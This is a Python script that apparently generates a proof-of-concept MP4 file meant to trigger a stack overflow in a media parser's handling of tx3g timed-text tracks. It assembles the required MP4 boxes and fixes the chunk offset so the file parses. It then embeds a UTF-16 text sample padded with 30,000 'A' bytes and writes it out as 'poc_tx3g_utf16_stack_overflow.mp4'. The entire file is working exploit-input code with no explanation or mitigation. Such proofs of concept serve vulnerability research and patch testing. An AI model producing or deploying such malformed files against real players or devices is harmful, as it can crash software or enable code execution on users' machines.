import struct
from pathlib import Path

def be32(x): return struct.pack(">I", x)
def be16(x): return struct.pack(">H", x)

def box(typ: bytes, payload: bytes) -> bytes:
    return be32(8 + len(payload)) + typ + payload

def full_box(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return box(typ, struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload)

def make_ftyp():
    major = b"isom"
    minor = 0
    compat = b"isom" + b"mp42"
    return box(b"ftyp", major + be32(minor) + compat)

def make_mvhd(timescale=1000, duration=1):
    creation = 0
    modif = 0
    rate = 0x00010000
    volume = 0x0100
    reserved = b"\x00"*10
    matrix = (
        be32(0x00010000) + be32(0) + be32(0) +
        be32(0) + be32(0x00010000) + be32(0) +
        be32(0) + be32(0) + be32(0x40000000)
    )
    predef = b"\x00"*24
    next_track_id = 2
    payload = (
        be32(creation) + be32(modif) + be32(timescale) + be32(duration) +
        be32(rate) + be16(volume) + b"\x00\x00" + reserved +
        matrix + predef + be32(next_track_id)
    )
    return full_box(b"mvhd", 0, 0, payload)

def make_tkhd(track_id=1, duration=1):
    flags = 0x000007
    creation = 0
    modif = 0
    reserved = 0
    layer = 0
    alternate_group = 0
    volume = 0
    matrix = (
        be32(0x00010000) + be32(0) + be32(0) +
        be32(0) + be32(0x00010000) + be32(0) +
        be32(0) + be32(0) + be32(0x40000000)
    )
    width = 0
    height = 0
    payload = (
        be32(creation) + be32(modif) + be32(track_id) + be32(reserved) +
        be32(duration) + b"\x00"*8 +
        be16(layer) + be16(alternate_group) + be16(volume) + b"\x00\x00" +
        matrix + be32(width) + be32(height)
    )
    return full_box(b"tkhd", 0, flags, payload)

def make_mdhd(timescale=1000, duration=1):
    creation = 0
    modif = 0
    language = 0x55c4
    predef = 0
    payload = be32(creation) + be32(modif) + be32(timescale) + be32(duration) + be16(language) + be16(predef)
    return full_box(b"mdhd", 0, 0, payload)

def make_hdlr(handler_type: bytes, name: bytes = b""):
    predef = 0
    reserved = b"\x00"*12
    payload = be32(predef) + handler_type + reserved + name + b"\x00"
    return full_box(b"hdlr", 0, 0, payload)

def make_nmhd():
    return full_box(b"nmhd", 0, 0, b"")

def make_dinf():
    url = full_box(b"url ", 0, 0x000001, b"")
    dref = full_box(b"dref", 0, 0, be32(1) + url)
    return box(b"dinf", dref)

def make_stts():
    return full_box(b"stts", 0, 0, be32(1) + be32(1) + be32(1))

def make_stsc():
    return full_box(b"stsc", 0, 0, be32(1) + be32(1) + be32(1) + be32(1))

def make_stsz(sample_size):
    return full_box(b"stsz", 0, 0, be32(0) + be32(1) + be32(sample_size))

def make_stco(chunk_offset):
    return full_box(b"stco", 0, 0, be32(1) + be32(chunk_offset))

def make_tx3g_sample_entry():
    reserved6 = b"\x00"*6
    data_ref = be16(1)
    display_flags = be32(0)
    h_just = struct.pack(">b", 0)
    v_just = struct.pack(">b", 0)
    bg = b"\x00\x00\x00\x00"
    default_box = be16(0) + be16(0) + be16(0) + be16(0)
    default_style = be16(0) + be16(0) + be16(0) + b"\x00" + b"\x00" + b"\x00\x00\x00\x00"
    payload = reserved6 + data_ref + display_flags + h_just + v_just + bg + default_box + default_style
    return box(b"tx3g", payload)

def make_stsd():
    entry = make_tx3g_sample_entry()
    return full_box(b"stsd", 0, 0, be32(1) + entry)

def make_stbl(stco_offset, sample_size):
    payload = make_stsd() + make_stts() + make_stsc() + make_stsz(sample_size) + make_stco(stco_offset)
    return box(b"stbl", payload)

def make_minf(stco_offset, sample_size):
    return box(b"minf", make_nmhd() + make_dinf() + make_stbl(stco_offset, sample_size))

def make_mdia(stco_offset, sample_size, timescale=1000, duration=1):
    return box(b"mdia", make_mdhd(timescale, duration) + make_hdlr(b"text", b"TimedText") + make_minf(stco_offset, sample_size))

def make_trak(stco_offset, sample_size, timescale=1000, duration=1):
    return box(b"trak", make_tkhd(1, duration) + make_mdia(stco_offset, sample_size, timescale, duration))

def make_moov(stco_offset, sample_size, timescale=1000, duration=1):
    return box(b"moov", make_mvhd(timescale, duration) + make_trak(stco_offset, sample_size, timescale, duration))

def build_mp4(text_len=30000):
    if not (3 <= text_len <= 65535):
        raise ValueError("text_len must be in [3, 65535] because tx3g stores it as u16")
    text_bytes = b"\xFE\xFF" + (b"A" * (text_len - 2))
    sample = be16(text_len) + text_bytes
    sample_size = len(sample)

    ftyp = make_ftyp()
    moov_placeholder = make_moov(0, sample_size)
    mdat = box(b"mdat", sample)

    chunk_offset = len(ftyp) + len(moov_placeholder) + 8
    moov = make_moov(chunk_offset, sample_size)

    return ftyp + moov + mdat, sample_size, chunk_offset

def main():
    mp4, sample_size, chunk_offset = build_mp4()
    out = Path("poc_tx3g_utf16_stack_overflow.mp4")
    out.write_bytes(mp4)
    print(f"[+] wrote {out}")
    text_len = struct.unpack(">H", mp4[-sample_size:][:2])[0]
    print(f"    text_len     = {text_len} (0x{text_len:04x})")
    print(f"    sample_size  = {sample_size} bytes")
    print(f"    stco offset  = {chunk_offset}")


if __name__ == "__main__":
    main()
